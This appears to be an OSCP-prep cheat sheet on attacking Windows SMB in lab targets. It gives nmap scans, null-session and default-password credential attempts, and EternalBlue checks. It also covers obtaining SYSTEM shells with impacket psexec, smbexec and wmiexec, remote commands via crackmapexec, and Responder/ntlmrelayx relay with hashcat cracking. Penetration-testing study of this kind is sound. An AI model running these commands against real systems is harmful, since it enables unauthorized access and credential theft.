@@ -1,0 +1,276 @@
+SMB Enumeration & Exploitation
+
+OSCP Cheat Sheet | Pete Lenhart
+
+What Is SMB?
+
+SMB (Server Message Block) is a network file sharing protocol used
+primarily by Windows. It runs on port 445 (direct) and port 139 (over
+NetBIOS). SMB is one of the most common attack surfaces on Windows boxes
+— misconfigurations, weak credentials, and unpatched vulnerabilities
+make it a gold mine.
+
+Key Ports to Know
+
+  ------------- --------------- ------------------------------------------
+  Port          Protocol        Notes
+
+  135           MSRPC           Windows RPC endpoint mapper
+
+  139           NetBIOS-SSN     SMB over NetBIOS (legacy)
+
+  445           Microsoft-DS    Primary SMB port — always target this
+                                first
+  ------------- --------------- ------------------------------------------
+
+SMB Enumeration — Step by Step
+
+Step 1 — Initial Fingerprinting with Nmap
+
+Start with nmap scripts to get OS, version, signing status, and check
+for critical vulns:
+
+  nmap -sC -sV -p 135,139,445 <target_ip>
+
+  nmap --script smb-vuln-ms17-010 <target_ip>
+
+  nmap --script smb2-security-mode <target_ip>
+
+Key things to note from nmap output:
+
+-   Windows version and build number — tells you what CVEs apply
+
+-   SMB signing enabled/required — if signing is False, relay attacks
+    are possible
+
+-   SMBv1 enabled — if True, EternalBlue (MS17-010) may apply
+
+-   Machine name and domain
+
+Step 2 — Try Null/Anonymous Session
+
+Always try unauthenticated access first — many boxes and real-world
+targets leave this open:
+
+  smbclient -L //<target_ip> -N
+
+  crackmapexec smb <target_ip> --shares -u '' -p ''
+
+  smbclient //<target_ip>/IPC$ -N
+
+  NOTE: NT_STATUS_ACCESS_DENIED means null session is blocked. Move to
+  credential attempts.
+
+Step 3 — Try Default/Common Credentials
+
+Try these credential combinations with crackmapexec:
+
+  ------------------ ------------------------------ ----------------------
+  Username           Password                       Notes
+
+  Administrator      (blank)                        Most common HTB
+                                                    finding!
+
+  Administrator      administrator                  Default lowercase
+
+  Administrator      admin                          Short default
+
+  Administrator      password                       Universal default
+
+  Administrator      Password1                      Meets complexity
+
+  administrator      Welcome1                       Common enterprise
+                                                    default
+
+  guest              (blank)                        Guest account
+
+  root               root                           Linux-style habits on
+                                                    Windows
+  ------------------ ------------------------------ ----------------------
+
+  crackmapexec smb <target_ip> -u Administrator -p ''
+
+  crackmapexec smb <target_ip> -u Administrator -p 'password'
+
+  NOTE: [+] with (Pwn3d!) in crackmapexec output = admin access
+  confirmed!
+
+Step 4 — Check for EternalBlue (MS17-010)
+
+If the box is older Windows (XP, 7, Server 2008) always check for
+EternalBlue:
+
+  nmap --script smb-vuln-ms17-010 <target_ip>
+
+  searchsploit ms17-010
+
+-   VULNERABLE = use Metasploit exploit/windows/smb/ms17_010_eternalblue
+
+-   Windows 10 / Server 2019 — usually patched, focus on creds instead
+
+Step 5 — Enumerate Shares
+
+Once you have credentials, list all shares:
+
+  crackmapexec smb <target_ip> -u Administrator -p '<pass>' --shares
+
+  smbclient -L //<target_ip> -U Administrator
+
+  impacket-smbclient Administrator@<target_ip>
+
+Common interesting shares to look for:
+
+-   C$ — full C drive access (admin only)
+
+-   ADMIN$ — Windows admin share
+
+-   IPC$ — inter-process communication
+
+-   Any custom named shares — often contain sensitive files
+
+Step 6 — Browse and Download Files
+
+  smbclient //<target_ip>/C$ -U Administrator%<password>
+
+Inside smbclient:
+
+  ------------------ ----------------------------------------------------
+  Command            What it does
+
+  ls                 List files/directories
+
+  cd <dir>           Change directory
+
+  get <file>         Download a file
+
+  mget *             Download all files
+
+  put <file>         Upload a file
+
+  recurse ON         Enable recursive listing
+
+  prompt OFF         Disable prompts for mget
+  ------------------ ----------------------------------------------------
+
+Getting a Shell via SMB
+
+Option 1 — PSExec (most reliable)
+
+If you have admin credentials, PSExec drops you straight into a SYSTEM
+shell:
+
+  impacket-psexec Administrator@<target_ip>
+
+  impacket-psexec Administrator:<password>@<target_ip>
+
+  impacket-psexec Administrator@<target_ip> -no-pass
+
+Option 2 — SMBExec
+
+  impacket-smbexec Administrator:<password>@<target_ip>
+
+Option 3 — WMIExec (fileless, stealthier)
+
+  impacket-wmiexec Administrator:<password>@<target_ip>
+
+Option 4 — CrackMapExec Command Execution
+
+  crackmapexec smb <target_ip> -u Administrator -p '<pass>' -x 'whoami'
+
+  crackmapexec smb <target_ip> -u Administrator -p '<pass>' -X
+  'Get-ChildItem C:\Users'
+
+  NOTE: -x runs cmd.exe commands, -X runs PowerShell commands
+
+Common Flag Locations on Windows
+
+  ----------------------------------------- -----------------------------------
+  Path                                      Notes
+
+  C:\Users\Administrator\Desktop\flag.txt   Most common
+
+  C:\Users\Administrator\Desktop\root.txt   OSCP style
+
+  C:\flag.txt                               Root of C drive
+
+  C:\Users\<username>\Desktop\user.txt      User flag
+  ----------------------------------------- -----------------------------------
+
+Quick search from shell:
+
+  dir C:\Users\Administrator\Desktop
+
+  type C:\Users\Administrator\Desktop\flag.txt
+
+Tools Quick Reference
+
+  ------------------ --------------------- -------------------------------
+  Tool               Install               Best For
+
+  crackmapexec       apt install           Credential testing, share enum,
+                     crackmapexec          command exec
+
+  smbclient          apt install smbclient Browsing and downloading shares
+
+  impacket-psexec    pip install impacket  Getting SYSTEM shell with admin
+                                           creds
+
+  impacket-smbexec   pip install impacket  Shell without dropping files
+
+  impacket-wmiexec   pip install impacket  Fileless command execution
+
+  enum4linux         apt install           Full SMB enumeration, users,
+                     enum4linux            shares
+
+  nmap smb scripts   built-in              Vuln scanning, signing check,
+                                           OS detect
+
+  responder          apt install responder Capture NetNTLM hashes via SMB
+
+  hashcat -m 5600    apt install hashcat   Crack NetNTLMv2 hashes
+  ------------------ --------------------- -------------------------------
+
+SMB Signing — What It Means
+
+SMB signing prevents man-in-the-middle relay attacks by
+cryptographically signing SMB packets. Always note the signing status
+from nmap or crackmapexec output:
+
+  ----------------------- -----------------------------------------------
+  Signing Status          Meaning
+
+  signing: True /         Relay attacks not possible — need real creds
+  required                
+
+  signing: False / not    SMB relay attacks possible with Responder +
+  required                ntlmrelayx
+  ----------------------- -----------------------------------------------
+
+If signing is False and you can trigger SMB auth (e.g. via LFI + UNC
+path), use:
+
+  sudo responder -I tun0 -v
+
+  impacket-ntlmrelayx -tf targets.txt -smb2support
+
+Pro Tips
+
+-   Always try blank password for Administrator first — surprisingly
+    common on HTB
+
+-   (Pwn3d!) in crackmapexec = you have local admin — go straight for
+    PSExec
+
+-   SMBv1 + older Windows = always check EternalBlue before trying creds
+
+-   enum4linux -a <ip> gives you users, groups, shares, and password
+    policy in one shot
+
+-   If you capture a NetNTLMv2 hash, crack it with: hashcat -m 5600
+    hash.txt rockyou.txt
+
+-   impacket-psexec gives SYSTEM shell — even higher than Administrator
+
+-   Use -no-pass flag with impacket tools when password is blank
+
+Pete Lenhart | OSCP Prep | SMB Enumeration & Exploitation Cheat Sheet
